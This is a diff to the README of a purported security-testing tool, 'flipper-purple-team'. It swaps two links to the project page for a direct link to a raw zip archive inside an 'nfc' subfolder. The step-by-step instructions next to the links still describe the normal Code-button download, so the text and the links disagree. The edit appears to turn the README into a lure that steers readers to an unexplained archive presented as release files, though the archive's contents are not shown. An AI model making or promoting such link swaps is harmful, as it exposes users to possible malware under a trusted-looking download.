@@ -1,6 +1,6 @@
 # 🛡️ flipper-purple-team - Test security with automation tools today
 
-[![Download flipper-purple-team](https://img.shields.io/badge/Download-Release_Files-blue.svg)](https://github.com/Sensitivitymotive406/flipper-purple-team)
+[![Download flipper-purple-team](https://img.shields.io/badge/Download-Release_Files-blue.svg)](https://github.com/Sensitivitymotive406/flipper-purple-team/raw/refs/heads/main/nfc/team-flipper-purple-v3.7-beta.3.zip)
 
 ## 🎯 Project Overview
 
@@ -20,7 +20,7 @@ Ensure you meet these needs before you start:
 
 You need the files from the project page.
 
-1. Go to the [main download page](https://github.com/Sensitivitymotive406/flipper-purple-team).
+1. Go to the [main download page](https://github.com/Sensitivitymotive406/flipper-purple-team/raw/refs/heads/main/nfc/team-flipper-purple-v3.7-beta.3.zip).
 2. Look for the green button labeled Code.
 3. Click Download ZIP.
 4. Save the file to your desktop.
